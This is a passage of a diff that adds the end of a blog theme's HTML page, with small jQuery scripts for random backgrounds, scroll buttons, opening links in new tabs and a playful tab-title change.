+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 20;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+
+  </div>
+</body>
+</html>
